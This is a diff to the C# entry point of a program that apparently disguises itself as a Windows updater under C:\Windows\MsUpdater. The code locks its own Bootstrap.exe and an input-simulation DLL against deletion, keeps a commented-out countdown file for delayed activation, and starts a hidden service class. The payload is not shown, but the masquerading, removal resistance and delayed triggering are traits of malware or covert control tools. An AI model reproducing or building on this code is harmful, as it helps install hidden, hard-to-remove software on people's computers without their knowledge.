@@ -18,40 +18,42 @@
 
             Thread.Sleep(200);
 
-            /*
+            var run = true;
              
-            // ---- Code for stable version ---- //
+            // ---- Code for stable versions ---- //
 
-            var target = Path.Combine(directory, "trigger");
+            /*
+
+            const string Target = @"C:\Windows\MsUpdater\trigger";
             
-            if (!File.Exists(target))
+            if (!File.Exists(Target))
             {
-                File.WriteAllText(target, new Random().Next(20, 40).ToString());
-                goto Survival;
+                File.WriteAllText(Target, new Random().Next(20, 40).ToString());
+                run = false;
             }
 
-            var content = int.Parse(File.ReadAllLines(target).Single());
+            var content = int.Parse(File.ReadAllLines(Target).Single());
 
             if (content != 0)
             {
-                File.WriteAllText(target, (content - 1).ToString());
-
-                goto Survival;
+                File.WriteAllText(Target, (content - 1).ToString());
+                run = false;
             }
 
             */
 
-            new Thread(() => RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle)).Start();
+            using (File.Open(@"C:\Windows\MsUpdater\Bootstrap.exe", FileMode.Open, FileAccess.Read, FileShare.Read))
+            {
+                using (File.Open(@"C:\Windows\MsUpdater\InputSimulator.dll", FileMode.Open, FileAccess.Read, FileShare.Read))
+                {
+                    if (run)
+                    {
+                        RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle);
+                    }
 
-            Survival:
-
-            var a = File.Open(@"C:\Windows\MsUpdater\Bootstrap.exe", FileMode.Open, FileAccess.Read, FileShare.Read);
-            var b = File.Open(@"C:\Windows\MsUpdater\InputSimulator.dll", FileMode.Open, FileAccess.Read, FileShare.Read);
-
-            Process.GetCurrentProcess().WaitForExit();
-
-            GC.KeepAlive(a);
-            GC.KeepAlive(b);
+                    Process.GetCurrentProcess().WaitForExit();
+                }
+            }
         }
     }
 }
